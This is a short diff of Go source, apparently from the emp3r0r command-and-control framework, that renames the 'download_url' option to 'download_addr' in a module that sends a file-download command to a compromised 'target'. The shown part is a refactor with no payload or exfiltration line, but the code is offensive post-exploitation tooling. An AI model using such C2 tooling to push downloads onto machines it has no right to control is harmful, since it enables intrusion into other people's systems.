@@ -32,7 +32,7 @@ func moduleFileServer() {
 }
 
 func moduleDownloader() {
-	requiredOptions := []string{"download_url", "checksum", "path"}
+	requiredOptions := []string{"download_addr", "checksum", "path"}
 	for _, opt := range requiredOptions {
 		if _, ok := Options[opt]; !ok {
 			CliPrintError("Option '%s' not found", opt)
@@ -40,11 +40,11 @@ func moduleDownloader() {
 		}
 	}
 
-	download_url := Options["download_url"].Val
+	download_addr := Options["download_addr"].Val
 	checksum := Options["checksum"].Val
 	path := Options["path"].Val
 
-	cmd := fmt.Sprintf("%s --download_url %s --checksum %s --path %s", emp3r0r_data.C2CmdFileDownloader, download_url, checksum, path)
+	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", emp3r0r_data.C2CmdFileDownloader, download_addr, checksum, path)
 	err = SendCmdToCurrentTarget(cmd, "")
 	if err != nil {
 		CliPrintError("SendCmd: %v", err)
